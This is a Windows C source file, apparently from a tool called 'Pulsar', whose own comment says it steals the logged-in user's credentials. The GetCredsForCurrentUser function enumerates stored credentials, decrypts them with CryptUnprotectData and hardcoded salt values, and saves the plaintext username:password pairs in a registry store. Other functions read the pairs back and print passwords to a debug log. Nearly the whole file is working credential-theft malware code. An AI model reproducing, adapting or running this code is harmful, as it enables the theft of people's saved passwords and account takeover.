#include <windows.h>
#include <wincred.h>
#include "PulsarInternal.h"
#include "PulsarLog.h"
#include "registry.h"

#pragma comment(lib, "Crypt32.lib")



//
//Given a site, populate the lpUserName and lpPassword fields
//with the user name and password collected for that site. Both
//fields are allocated on the heap and it is the user's responsibility
//to free them after use
//
BOOL GetCredsForSite(LPSTR lpSite, LPSTR *lpUserName, LPSTR *lpPassword) {
	CHAR *credStr;
	DWORD len;

	DBGPrint("Called. Getting creds for %s\n",lpSite);


	credStr = GetCredsFromReg(lpSite);
	if(credStr == NULL){
		DBGPrint("Null creds\n");
		return FALSE;
	}

	//Got the creds now splitting them
	DBGPrint("Parsing: %s\n",credStr);

	CHAR *ptr = strchr(credStr, ':');
	*ptr = '\0';
	DBGPrint("credStr: %s\n",credStr);

	len = ( strlen(credStr) + 1 ) * sizeof(CHAR);
	DBGPrint("len: %d\n",len);
	*lpUserName = (LPSTR ) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,len );
	strcpy_s(*lpUserName,len,credStr);

	ptr++;
	len = (strlen(ptr) + 1 ) * sizeof(CHAR);
	*lpPassword = (LPSTR) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,len);
	strcpy_s(*lpPassword,len,ptr);

	DBGPrint("Username=%s\n Password=%s\n", *lpUserName, *lpPassword);
  	DBGPrint("Returning\n");
	return TRUE;


}


//
//Set up the registry key for the credentials
//
BOOL InitCredStore(VOID){
	DBGPrint("Called\n");
	HKEY hKey;
	BOOL bRetVal = TRUE;
	
	//Check for registry key and create if its not there
	LONG lResult = RegOpenKeyEx (HKEY_LOCAL_MACHINE, CRED_STORE_KEY, 0, KEY_READ, &hKey);

	if (lResult != ERROR_SUCCESS) 
	{
		DBGPrint("Registry key missing, creating...\n");
		lResult = RegCreateKey(HKEY_LOCAL_MACHINE,CRED_STORE_KEY,&hKey);	
		if (lResult != ERROR_SUCCESS){
			DBGPrint("Failed to create Registry Key\n");
			bRetVal = FALSE;
		}else{		
			DBGPrint("Registry key created\n");
			RegCloseKey(hKey);
		}
	}
	DBGPrint("Returning\n");
	return bRetVal;
}





//
//Add the collected credendials to the store, we 
//always take the "freshest" ones, so any new
//creds will overwrite old creds for a given site. 
//This is the best way to keep up to date creds without
//a far more complex cred management system (users, aging,
//etc..)
//
BOOL StoreCreds(LPSTR lpSite, LPSTR lpCredStr){
	BOOL bRetVal = FALSE;

	DBGPrint("Called with %s and %s\n",lpSite,lpCredStr);


	//Add String with lpSite and lpCredStr
	bRetVal = StoreCredsInReg(lpSite, lpCredStr);

	DBGPrint("Returning\n");
	return bRetVal;

}

//
// Impersonate the currently logged in user, and steal their credentials
//
BOOL GetCredsForCurrentUser(LPSTR lpSite){

	DATA_BLOB DataIn;
	DATA_BLOB DataOut;
	DATA_BLOB OptionalEntropy;
	short tmpSaltType1[37];
	short tmpSaltType0[37];
	char *strSaltType1={"abe2869f-9b47-4cd9-a358-c22904dba7f7"};
	char *strSaltType0={"82BD0E67-9FEA-4748-8672-D5EFE5B779B0"};

	BOOL bRetVal = FALSE;

	CHAR strCredentials[1024];

	DBGPrint("Called\n");
	DBGPrint("Site: %s\n",lpSite);


	//Create the entropy/salt required for decryption...
	for (int i=0; i< 37; i++) {
		tmpSaltType1[i] = (short int)(strSaltType1[i] * 4);
		tmpSaltType0[i] = (short int)(strSaltType0[i] * 4);
	}

	OptionalEntropy.cbData = 74;

	DWORD Count;
	PCREDENTIAL *Credential;

	//Now enumerate all http stored credentials....
	if (CredEnumerate(NULL,0,&Count,&Credential)) {
		DBGPrint("Credential count: %d \n",Count);
		for(DWORD i=0;i<Count;i++) {
			DBGPrint("Credential type: %d Target Name: %s\n",Credential[i]->Type,Credential[i]->TargetName);

			if(Credential[i]->Type == 0){
				OptionalEntropy.pbData = (BYTE *)&tmpSaltType0;
			}else if (Credential[i]->Type == 1){
				OptionalEntropy.pbData = (BYTE *)&tmpSaltType1;
			}else{
				DBGPrint("Can't decrypt this credential type\n");
				continue;
			}

			DataIn.pbData = (BYTE *)Credential[i]->CredentialBlob;
			DataIn.cbData = Credential[i]->CredentialBlobSize;

				if (CryptUnprotectData(&DataIn, NULL, &OptionalEntropy, NULL,NULL,0,&DataOut)) {
					
					//Extract username & password from credentails (username:password)
					sprintf_s(strCredentials, 1024, "%s", DataOut.pbData);
					DBGPrint("strCredentials%s\n",strCredentials);
					StoreCreds(Credential[i]->TargetName,strCredentials);


					bRetVal = TRUE;
			
				} else {
					DBGPrint("Failed to unprotect creds: %d\n", GetLastError());
				}

		} // End of FOR loop

		CredFree(Credential);
	}else{
		DBGPrint("No Credentials found\n");
	}

  	DBGPrint("Returning\n\n");
	return bRetVal;

}